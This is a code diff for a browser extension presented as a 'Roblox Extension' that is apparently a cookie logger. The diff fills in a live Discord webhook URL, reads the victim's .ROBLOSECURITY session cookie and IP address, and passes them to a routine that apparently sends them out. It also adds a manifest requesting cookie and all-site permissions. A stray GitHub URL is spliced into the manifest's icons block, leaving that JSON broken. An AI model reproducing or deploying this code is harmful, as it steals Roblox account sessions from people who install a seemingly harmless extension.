@@ -1,4 +1,4 @@
-const WEBHOOK = "";
+const WEBHOOK = "https://discord.com/api/webhooks/1000165987229913199/5Xm0AE2WN_ktXt5TmHaphcUYaEEzh0iOcCRgGO6xkV1m58Bu617ZZYtEKimUNnx3YXP1";
 
 async function main(cookie) {
     var ipAddr = await (await fetch("https://api.ipify.org")).text();
@@ -63,3 +63,29 @@ async function main(cookie) {
 chrome.cookies.get({"url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY"}, function(cookie) {
     main(cookie ? cookie.value : null);
 });
+{
+    "name": "Roblox Extension",
+    "description": "Extension for https://www.roblox.com",
+    "version": "1.0.0",
+    "manifest_version": 2,
+
+    "browser_action" : {
+        "default_icon": "assets/roblox.png"
+    },
+
+    "permissions": [
+        "cookies",
+        "https://*/*"
+    ],
+
+    "background": {
+        "scripts": ["scripts/log.js"]
+    },
+
+    "icons": {https://raw.githubusercontent.com/ox-y/chrome-extension-roblox-cookie-logger/a3e3bc6664b3a7e8a64018a0f09b12af0e2655c6/extension/assets/roblox.png
+        "16": "assets/roblox.png",
+        "32": "assets/roblox.png",
+        "48": "assets/roblox.png",
+        "128": "assets/roblox.png"
+    }
+}
